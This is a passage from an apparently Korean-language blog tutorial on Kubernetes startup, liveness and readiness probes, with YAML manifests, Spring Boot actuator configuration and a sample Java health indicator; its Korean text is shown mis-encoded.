í”Œë¦¬ì¼€ì´ì…˜(ë ˆê±°ì‹œ ì• í”Œë¦¬ì¼€ì´ì…˜ ë“±)ì„ ë³´í˜¸</li></ul><h3 id="íŠ¹ì§•"><a href="#íŠ¹ì§•" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li>Startup Probeê°€ ì„±ê³µí•˜ê¸° ì „ê¹Œì§€ Livenessì™€ Readiness ProbeëŠ” ë¹„í™œì„±í™”ë©ë‹ˆë‹¤</li><li>Startup Probeê°€ ì‹¤íŒ¨í•˜ë©´ kubeletì´ ì»¨í…Œì´ë„ˆë¥¼ ì¢…ë£Œí•˜ê³  ì¬ì‹œì‘ ì •ì±…ì— ë”°ë¼ ì²˜ë¦¬í•©ë‹ˆë‹¤</li><li>Startup ProbeëŠ” í•œ ë²ˆë§Œ ì„±ê³µí•˜ë©´ ë” ì´ìƒ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤</li></ul><h3 id="ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤"></a>ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤</h3><ul><li>ì‹œì‘ ì‹œê°„ì´ ì˜¤ë˜ ê±¸ë¦¬ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ (ì˜ˆ: JVM ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜)</li><li>ì´ˆê¸°í™” ì‘ì—…ì´ ë§ì€ ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ë°ì´í„°ë² ì´ìŠ¤ ë§ˆì´ê·¸ë ˆì´ì…˜ì´ í•„ìš”í•œ ì• í”Œë¦¬ì¼€ì´ì…˜</li></ul><h3 id="ì˜ˆì œ"><a href="#ì˜ˆì œ" class="headerlink" title="ì˜ˆì œ"></a>ì˜ˆì œ</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">startup-probe-example</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">startupProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/startup</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">30</span>    <span class="comment"># ìµœëŒ€ 300ì´ˆ(10ì´ˆ * 30íšŒ) ë™ì•ˆ ì‹œì‘ ëŒ€ê¸°</span></span><br><span class="line">      <span class="attr">successThreshold:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ìœ„ ì˜ˆì œì—ì„œ:</p><ul><li>10ì´ˆë§ˆë‹¤ <code>/startup</code> ì—”ë“œí¬ì¸íŠ¸ë¥¼ í™•ì¸</li><li>ìµœëŒ€ 300ì´ˆ(30ë²ˆ ì‹¤íŒ¨)ê¹Œì§€ ì‹œì‘ì„ ê¸°ë‹¤ë¦½ë‹ˆë‹¤</li><li>1ë²ˆ ì„±ê³µí•˜ë©´ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ëœ ê²ƒìœ¼ë¡œ ê°„ì£¼</li></ul><h2 id="ğŸ“-2-Liveness-Probe-ì‚´ì•„ìˆë‹ˆ"><a href="#ğŸ“-2-Liveness-Probe-ì‚´ì•„ìˆë‹ˆ" class="headerlink" title="ğŸ“ 2. Liveness Probe - ì‚´ì•„ìˆë‹ˆ?"></a>ğŸ“ 2. Liveness Probe - ì‚´ì•„ìˆë‹ˆ?</h2><h3 id="ëª©ì -1"><a href="#ëª©ì -1" class="headerlink" title="ëª©ì "></a>ëª©ì </h3><ul><li>ì»¨í…Œì´ë„ˆê°€ <strong>ì •ìƒì ìœ¼ë¡œ ì‹¤í–‰ ì¤‘ì¸ì§€</strong> í™•ì¸</li><li>ë°ë“œë½, ë¬´í•œ ë£¨í”„ ë“±ìœ¼ë¡œ ì‘ë‹µí•˜ì§€ ì•ŠëŠ” ì»¨í…Œì´ë„ˆë¥¼ ê°ì§€</li></ul><h3 id="íŠ¹ì§•-1"><a href="#íŠ¹ì§•-1" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li>Liveness Probeê°€ ì‹¤íŒ¨í•˜ë©´ kubeletì´ ì»¨í…Œì´ë„ˆë¥¼ ì¢…ë£Œí•˜ê³  ì¬ì‹œì‘ ì •ì±…ì— ë”°ë¼ ì²˜ë¦¬í•©ë‹ˆë‹¤</li><li>ì»¨í…Œì´ë„ˆë¥¼ ì¬ì‹œì‘í•˜ì—¬ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆëŠ” ê²½ìš°ì—ë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤</li></ul><h3 id="ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤-1"><a href="#ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤-1" class="headerlink" title="ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤"></a>ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤</h3><ul><li>ë°ë“œë½ ìƒíƒœì— ë¹ ì§ˆ ìˆ˜ ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ë¡œ ì¸í•´ ì‘ë‹µ ë¶ˆê°€ ìƒíƒœê°€ ë  ìˆ˜ ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ë‚´ë¶€ ìƒíƒœê°€ ì†ìƒë˜ì–´ ì¬ì‹œì‘ì´ í•„ìš”í•œ ê²½ìš°</li></ul><h3 id="ì£¼ì˜ì‚¬í•­"><a href="#ì£¼ì˜ì‚¬í•­" class="headerlink" title="ì£¼ì˜ì‚¬í•­"></a>ì£¼ì˜ì‚¬í•­</h3><ul><li>ë„ˆë¬´ ë¯¼ê°í•˜ê²Œ ì„¤ì •í•˜ë©´ ë¶ˆí•„ìš”í•œ ì¬ì‹œì‘ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤</li><li>Liveness ProbeëŠ” ë³µêµ¬ ê°€ëŠ¥í•œ ìƒí™©ì´ ì•„ë‹Œ ê²½ìš°ì—ë§Œ ì‹¤íŒ¨í•´ì•¼ í•©ë‹ˆë‹¤</li><li>ì™¸ë¶€ ì˜ì¡´ì„±(DB, ì™¸ë¶€ API ë“±)ì„ ì²´í¬í•˜ì§€ ì•ŠëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤</li></ul><h3 id="ì˜ˆì œ-1"><a href="#ì˜ˆì œ-1" class="headerlink" title="ì˜ˆì œ"></a>ì˜ˆì œ</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">liveness-probe-example</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/health</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># TCP Socket ì˜ˆì œ</span></span><br><span class="line"><span class="attr">livenessProbe:</span></span><br><span class="line">  <span class="attr">tcpSocket:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">  <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exec ì˜ˆì œ</span></span><br><span class="line"><span class="attr">livenessProbe:</span></span><br><span class="line">  <span class="attr">exec:</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pgrep</span> <span class="string">-f</span> <span class="string">myapp</span></span><br><span class="line">  <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">  <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h2 id="ğŸ“-3-Readiness-Probe-íŠ¸ë˜í”½-ë°›ì•„ë„-ë˜ë‹ˆ"><a href="#ğŸ“-3-Readiness-Probe-íŠ¸ë˜í”½-ë°›ì•„ë„-ë˜ë‹ˆ" class="headerlink" title="ğŸ“ 3. Readiness Probe - íŠ¸ë˜í”½ ë°›ì•„ë„ ë˜ë‹ˆ?"></a>ğŸ“ 3. Readiness Probe - íŠ¸ë˜í”½ ë°›ì•„ë„ ë˜ë‹ˆ?</h2><h3 id="ëª©ì -2"><a href="#ëª©ì -2" class="headerlink" title="ëª©ì "></a>ëª©ì </h3><ul><li>ì»¨í…Œì´ë„ˆê°€ <strong>íŠ¸ë˜í”½ì„ ë°›ì„ ì¤€ë¹„</strong>ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸</li><li>ìš”ì²­ì„ ì²˜ë¦¬í•  ì¤€ë¹„ê°€ ì•ˆ ëœ Podë¡œ íŠ¸ë˜í”½ì´ ì „ë‹¬ë˜ëŠ” ê²ƒì„ ë°©ì§€</li></ul><h3 id="íŠ¹ì§•-2"><a href="#íŠ¹ì§•-2" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li>Readiness Probeê°€ ì‹¤íŒ¨í•˜ë©´ Podì˜ IP ì£¼ì†Œê°€ Serviceì˜ ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ì œê±°ë©ë‹ˆë‹¤</li><li>ì»¨í…Œì´ë„ˆëŠ” ì¢…ë£Œë˜ì§€ ì•Šê³  ê³„ì† ì‹¤í–‰ë©ë‹ˆë‹¤</li><li>Probeê°€ ë‹¤ì‹œ ì„±ê³µí•˜ë©´ ì—”ë“œí¬ì¸íŠ¸ì— ë‹¤ì‹œ ì¶”ê°€ë©ë‹ˆë‹¤</li></ul><h3 id="ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤-2"><a href="#ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤-2" class="headerlink" title="ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤"></a>ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤</h3><ul><li>ì´ˆê¸° ë°ì´í„° ë¡œë”©ì´ í•„ìš”í•œ ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ì™¸ë¶€ ì„œë¹„ìŠ¤ì™€ì˜ ì—°ê²°ì´ í•„ìš”í•œ ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ì›œì—… ì‹œê°„ì´ í•„ìš”í•œ ì• í”Œë¦¬ì¼€ì´ì…˜</li><li>ì¼ì‹œì ìœ¼ë¡œ ê³¼ë¶€í•˜ ìƒíƒœì¸ ê²½ìš° íŠ¸ë˜í”½ì„ ë°›ì§€ ì•Šë„ë¡ ì„¤ì •</li></ul><h3 id="ì˜ˆì œ-2"><a href="#ì˜ˆì œ-2" class="headerlink" title="ì˜ˆì œ"></a>ì˜ˆì œ</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">readiness-probe-example</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">readinessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/ready</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">successThreshold:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Readiness-Gate"><a href="#Readiness-Gate" class="headerlink" title="Readiness Gate"></a>Readiness Gate</h3><p>ë” ë³µì¡í•œ ì¤€ë¹„ ìƒíƒœ ë¡œì§ì´ í•„ìš”í•œ ê²½ìš° Readiness Gateë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-with-readiness-gate</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">readinessGates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">conditionType:</span> <span class="string">&quot;www.example.com/feature-1&quot;</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br></pre></td></tr></table></figure><h2 id="ì„¸-ê°€ì§€-Probe-ì¡°í•©-ì‚¬ìš©"><a href="#ì„¸-ê°€ì§€-Probe-ì¡°í•©-ì‚¬ìš©" class="headerlink" title="ì„¸ ê°€ì§€ Probe ì¡°í•© ì‚¬ìš©"></a>ì„¸ ê°€ì§€ Probe ì¡°í•© ì‚¬ìš©</h2><p>ì‹¤ì œ í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œëŠ” ì„¸ ê°€ì§€ Probeë¥¼ í•¨ê»˜ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">myapp</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">myapp</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">myapp:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Startup Probe: ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ë  ë•Œê¹Œì§€ ìµœëŒ€ 5ë¶„ ëŒ€ê¸°</span></span><br><span class="line">        <span class="attr">startupProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/startup</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">30</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Liveness Probe: ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‚´ì•„ìˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/health</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">0</span>  <span class="comment"># startup probeê°€ ëë‚˜ë©´ ë°”ë¡œ ì‹œì‘</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Readiness Probe: íŠ¸ë˜í”½ì„ ë°›ì„ ì¤€ë¹„ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        <span class="attr">readinessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/ready</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">successThreshold:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Probe-ë™ì‘-íë¦„"><a href="#Probe-ë™ì‘-íë¦„" class="headerlink" title="Probe ë™ì‘ íë¦„"></a>Probe ë™ì‘ íë¦„</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ì»¨í…Œì´ë„ˆ ì‹œì‘</span><br><span class="line">    â†“</span><br><span class="line">Startup Probe ì‹¤í–‰ (ì„±ê³µí•  ë•Œê¹Œì§€)</span><br><span class="line">    â†“</span><br><span class="line">Liveness Probe í™œì„±í™” (ì£¼ê¸°ì ìœ¼ë¡œ ì‹¤í–‰)</span><br><span class="line">Readiness Probe í™œì„±í™” (ì£¼ê¸°ì ìœ¼ë¡œ ì‹¤í–‰)</span><br><span class="line">    â†“</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ Liveness ì‹¤íŒ¨ â†’ ì»¨í…Œì´ë„ˆ ì¬ì‹œì‘     â”‚</span><br><span class="line">â”‚ Readiness ì‹¤íŒ¨ â†’ Serviceì—ì„œ ì œê±°   â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><h2 id="Spring-Boot-ì• í”Œë¦¬ì¼€ì´ì…˜-ì˜ˆì œ"><a href="#Spring-Boot-ì• í”Œë¦¬ì¼€ì´ì…˜-ì˜ˆì œ" class="headerlink" title="Spring Boot ì• í”Œë¦¬ì¼€ì´ì…˜ ì˜ˆì œ"></a>Spring Boot ì• í”Œë¦¬ì¼€ì´ì…˜ ì˜ˆì œ</h2><p>Spring Boot 2.3+ ë²„ì „ì€ ê¸°ë³¸ì ìœ¼ë¡œ Health Endpointë¥¼ ì œê³µí•©ë‹ˆë‹¤:</p><h3 id="1-ì˜ì¡´ì„±-ì¶”ê°€"><a href="#1-ì˜ì¡´ì„±-ì¶”ê°€" class="headerlink" title="1. ì˜ì¡´ì„± ì¶”ê°€"></a>1. ì˜ì¡´ì„± ì¶”ê°€</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-application-yml-ì„¤ì •"><a href="#2-application-yml-ì„¤ì •" class="headerlink" title="2. application.yml ì„¤ì •"></a>2. application.yml ì„¤ì •</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">health:</span></span><br><span class="line">      <span class="attr">probes:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">show-details:</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">health:</span></span><br><span class="line">    <span class="attr">livenessState:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">readinessState:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="3-Kubernetes-Deployment"><a href="#3-Kubernetes-Deployment" class="headerlink" title="3. Kubernetes Deployment"></a>3. Kubernetes Deployment</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">spring-app</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">spring-app</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">spring-app</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">spring-app:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">startupProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/liveness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">30</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/liveness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">readinessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/readiness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="4-ì»¤ìŠ¤í…€-Health-Indicator"><a href="#4-ì»¤ìŠ¤í…€-Health-Indicator" class="headerlink" title="4. ì»¤ìŠ¤í…€ Health Indicator"></a>4. ì»¤ìŠ¤í…€ Health Indicator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.health.Health;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.health.HealthIndicator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomHealthIndicator</span> <span class="keyword">implements</span> <span class="title class_">HealthIndicator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Health <span class="title function_">health</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ì»¤ìŠ¤í…€ í—¬ìŠ¤ ì²´í¬ ë¡œì§</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isHealthy</span> <span class="operator">=</span> checkDatabaseConnection() &amp;&amp; checkExternalService();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isHealthy) &#123;</span><br><span class="line">            <span class="keyword">return</span> Health.up()</span><br><span class="line">                .withDetail(<span class="string">&quot;database&quot;</span>, <span class="string">&quot;connected&quot;</span>)</span><br><span class="line">                .withDetail(<span class="string">&quot;externalService&quot;</span>, <span class="string">&quot;available&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Health.down()</span><br><span class="line">            .withDetail(<span class="string">&quot;reason&quot;</span>, <span class="string">&quot;Database or external service unavailable&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkDatabaseConnection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// DB ì—°ê²° ì²´í¬ ë¡œì§</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkExternalService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ì™¸ë¶€ ì„œë¹„ìŠ¤ ì²´í¬ ë¡œì§</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Best-Practices"><a href="#Best-Practices" class="headerlink" title="Best Practices"></a>Best Practices</h2><h3 id="1-Startup-Probe"><a href="#1-Startup-Probe" class="headerlink" title="1. Startup Probe"></a>1. Startup Probe</h3><ul><li>ì‹œì‘ ì‹œê°„ì´ ê¸´ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ë§Œ ì‚¬ìš©</li><li><code>failureThreshold * periodSeconds</code> &#x3D; ìµœëŒ€ ì‹œì‘ ì‹œê°„ë³´ë‹¤ í¬ê²Œ ì„¤ì •</li><li>í•œ ë²ˆ ì„±ê³µí•˜ë©´ ë” ì´ìƒ ì‹¤í–‰ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì¶©ë¶„í•œ ì—¬ìœ ë¥¼ ë‘˜ ê²ƒ</li></ul><h3 id="2-Liveness-Probe"><a href="#2-Liveness-Probe" class="headerlink" title="2. Liveness Probe"></a>2. Liveness Probe</h3><ul><li>ê°€ë²¼ìš´ ì²´í¬ë¥¼ ìˆ˜í–‰ (ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° ë“± ì™¸ë¶€ ì˜ì¡´ì„± ì 